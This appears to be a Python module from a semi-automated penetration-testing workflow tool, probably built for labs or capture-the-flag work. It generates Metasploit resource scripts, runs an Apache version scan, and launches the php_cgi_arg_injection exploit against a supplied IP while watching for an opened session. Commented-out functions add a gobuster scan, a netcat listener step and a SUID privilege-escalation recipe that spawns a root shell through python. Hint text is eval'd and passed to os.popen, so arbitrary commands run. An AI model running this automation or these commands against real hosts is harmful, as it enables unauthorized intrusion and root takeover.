from inspect import Parameter
import os
import getpass
from matplotlib.pyplot import hist
from numpy import mat
from packaging import version
from subprocess import Popen, PIPE
import re
import subprocess
from termios import tcflush, TCIFLUSH
import sys

Default = False

def concatenate_cmd(args):
    cmd = ""
    for e in args:
        cmd += e + " "
    return cmd

def get_output_data(Data, block_Out):
    for para in block_Out:
        try: # if Data doesn't contain para, we give it as None
            Data[para]
        except KeyError:
            Data[para] = None
        if Data[para] == None:
            user_input = input("Please find value of \"{para}\" in above output, and enter it: ".format(para=para))
            if user_input != '':
                if user_input.lower() == 'true':
                    Data[para] = True
                elif user_input.lower() == 'false' :
                    Data[para] = False
                else:
                    Data[para] = user_input
    # print("update data:", Data)
    return Data

def check_output_data(Data, block_Out):
    match = True
    for para in block_Out:
        if Data[para] == None:
            match = False
    return match

def give_hint(hints, args, func_in, Data):
    # flush input buffer, in case there are any unexpected user input before that affect input()
    # tcflush(sys.stdin, TCIFLUSH)
    # cmd = concatenate_cmd(args)
    if hints!=None:
        for hint in hints:
            # if ("<cmd>") in hint:
            #     hint =  hint.replace("<cmd>", cmd)
            # if ("+FORMAT+") in hint:
            #     hint =  hint.replace("+FORMAT+", "")
            #     print(eval("f'{}'".format(hint)))
            # else:
            #	 print(hint)
            
            # flush input buffer, in case there are any unexpected user input before that affect input()
            tcflush(sys.stdin, TCIFLUSH)
            if ("[EXE]") in hint:
                hint =  hint.replace("[EXE]", "")
                hint = eval("f'''{}'''".format(hint))
                print(f"[EXE] {hint}")
                # 1st subprocess way
                proc = os.popen(hint)
                print(proc.read())
                proc.close()
                
                # 2nd subprocess way
                # hint_list = hint.split()
                # proc = subprocess.check_call(hint_list)
                
                # 3rd subprocess way
                # hint_list = hint.split()
                # proc = Popen(hint_list, stdout=PIPE)
                # temp = open('temp.txt', 'w')
                # temp.truncate(0)
                # for stdout_line in iter(proc.stdout.readline, b''):
                #     print("{}".format(stdout_line.decode('utf-8')).rstrip()) 
                #     temp.write("{}\n".format(stdout_line.decode('utf-8')).rstrip())
            elif ("[INPUT]") in hint:
                hint =  hint.replace("[INPUT]", "")
                Data[hint] = input(f'Please find value of "{hint}" in above output and enter it (enter "None" if no data): ')
                if Data[hint].lower() == "none":
                    return False
            else:
                while 1:
                    try:
                        print(eval("f'''{}'''".format(hint)))
                        break
                    except KeyError as k:
            			# print(k.args[0])
                        Data[k.args[0]] = input(f'Please find value of "{k.args[0]}" in above output and enter it (enter "None" if no data): ')
                        if Data[k.args[0]].lower() == "none":
                            return False
            if hint.lower().find('(y/n)') >= 0:
                user_input = input('Please enter y/n: '	)
                while user_input.lower() != 'y' and user_input.lower() != 'n':
                    user_input = input('Please enter y/n: ')
                if user_input.lower() == 'n':
                    return False
                print('')
            else:
                user_input = input('press Enter to continue...\n')
    return True

class Function():
    def http_version(func_in, Data, args, block_In, block_Out, block_hint):
        # - msfconsole
        # - wait for 15s (msfconsole opening)
        # - use auxiliary/scanner/http/http_version
        # - set RHOSTS {IP}
        # - run
        # - (assume get Apache/2.4.6)

        configFile=open('meta.rc','w')
        configFile.write('use auxiliary/scanner/http/http_version\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if "Apache/" in outputLine:
                From = outputLine.find('Apache/')+len('Apache/')
                Data['Apache'] = outputLine[From:From+10].split(' ')[0]
                # print(Data['Apache'])
                # problem 1:This way, however, isn't import condition from block!!!
                if version.parse(Data['Apache']) < version.parse('3.1'):
                    match = True

            print(outputLine)     
        
        match = check_output_data(Data, block_Out)
        return Data, match

    def php_cgi_arg_injection(func_in, Data, args, block_In, block_Out, block_hint):
        # use exploit/multi/http/php_cgi_arg_injection
        # - set RHOSTS {IP}
        # - run
        configFile=open('meta.rc','w')
        configFile.write('use exploit/multi/http/php_cgi_arg_injection\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if re.search("session [0-9] opend", outputLine)!=None:
                match = True
            print(outputLine)        
        match = check_output_data(Data, block_Out)
        return Data, match

    def metasploit(func_in, Data, args, block_In, block_Out, block_hint):
        script_name = ""
        for arg in args:
            if ".rc" in arg:
                script_name = arg
                break
        # start with a template script
        templateFile=open("./meta_script_template/" + script_name,'r')
        configFile=open(script_name,'w')
        for line in templateFile:
            subst_line = line
            if '<' in line and '>' in line:
                l = line.find('<')
                r = line.find('>')
                param = line[l+1:r]
                subst_line = line.replace("<" + param + ">",Data[param])
            configFile.write(subst_line + "\n")
        templateFile.close()
        configFile.close()
        # run the script
        proc = Popen(['msfconsole'] + args, stdout=PIPE)

        # grab needed info from script
        for stdout_line in iter(proc.stdout.readline, b''): 
            
            outputLine = stdout_line.decode('utf-8').rstrip()
            
            # code below just for getting apache version
            if "Apache/" in outputLine:
                From = outputLine.find('Apache/')+len('Apache/')
                Data['Apache'] = outputLine[From:From+10].split(' ')[0]
                if version.parse(Data['Apache']) < version.parse('3.1'):
                    match = True
            
            if re.search("session [0-9] opend", outputLine)!=None:
                match = True

            print(outputLine)  

        match = check_output_data(Data, block_Out)
        return Data, match 
        
    def print_something(func_in, Data, args, block_In, block_Out, block_hint):
        print("class chain is running~~")
        match = check_output_data(Data, block_Out)
        return Data, match
    '''
    def gobuster(func_in, Data, args, block_In, block_Out, block_hint):
        proc = Popen(['gobuster', 'dir', '-u', func_in['IP'], '-w', '/usr/share/wordlists/dirb/common.txt'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''):
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            print(outputLine)
            if re.search("/panel", outputLine)!=None:
                match = True
                return Data, match
        # os.system(f"gobuster dir -u {func_in['IP']} -w /usr/share/wordlists/dirb/common.txt")
        match = check_output_data(Data, block_Out)
        # return Data, match

    def netcat(func_in, Data, args, block_In, block_Out, block_hint):
        cmd = ""
        for e in args:
            cmd += e + " "
        print(f'\nPlease open another terminal and enter `nc {cmd}{func_in["port"]}`.')
        result = input("After done, press enter to move on next step.\n")
        match = check_output_data(Data, block_Out)
        return Data, match
    '''
    def create_file(func_in, Data, args, block_In, block_Out, block_hint):
        try:
            if "[" in args[1]:
            	args[1] = eval(args[1])
            	# print(f'/home/{getpass.getuser()}/Desktop/{args[1]}')
            with open(f'/home/{getpass.getuser()}/Desktop/{args[1]}', 'w') as f:
                file = args[0]
                for i in block_In:
                    file = file.replace(f"REPLACE_IT_{i}", Data[i])
                f.write(file)
        except FileNotFoundError:
            print(f'Fail to create a file on path:/home/{getpass.getuser()}/Desktop/')
        give_hint(block_hint, args, func_in, Data)
        match = check_output_data(Data, block_Out)
        return Data, match

    '''
    def get_root(func_in, Data, args, block_In, block_Out, block_hint):
        print('\nPlease enter `find / -user root -perm -4000 -exec ls -ldb {} \; | grep root` in shell you got.')
        result = input("If you see python has root permission, enter yes, else enter no.\n")
        if result != "no":
            print('\nEnter `python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'` in shell, and you will be root.\n')
        else:
            print("\nSorry we can't help :(\n")
        match = check_output_data(Data, block_Out)
        return Data, match
    '''
    def magic_function(func_in, Data, args, block_In, block_Out, block_hint):
        flag = False
        hint_result = False
        print("data: ", Data, "\n")
        for i in range(len(args)):
            if flag == True:
                break
            else:
                for input_token in func_in:
                    # if ("<" + input_token + ">") in args[i]:
                    if Data[input_token] == None:
                        # TO DO: Add user input to continue. Data, connect to user_takeover if possible.
                        print('There are some missing data. ' + input_token + ' cannot be empty!')
                        mode = input("Please choose next step. 1 for user take over, 2 for running other class methods.\nNext step: ")
                        if mode == '1':
                            u_in = input("Input " + input_token + ": ")
                            # args[i] =  args[i].replace("<" + input_token + ">", u_in)
                            Data[input_token] = u_in
                        elif mode == '2':
                            flag = True
                            break
                        else:
                            flag = True
                            break
                    # else:
                    #     args[i] =  args[i].replace("<" + input_token + ">", Data[input_token])
        if flag == False:
            # if args!=None and args!=[]:
            #     if  args[0]!='NOEXE' :
            #         print("in magic_function excute:", concatenate_cmd(args))
            #         proc = Popen(args, stdout=PIPE)
            #         temp = open('temp.txt', 'w')
            #         temp.truncate(0)
            #         for stdout_line in iter(proc.stdout.readline, b''):
            #             print("{}".format(stdout_line.decode('utf-8')).rstrip()) 
            #             temp.write("{}\n".format(stdout_line.decode('utf-8')).rstrip())
            #     else:
            #         args.remove('NOEXE')
            hint_result = give_hint(block_hint, args, func_in, Data)
        Data = get_output_data(Data, block_Out)
        match = check_output_data(Data, block_Out) & hint_result
        return Data, match
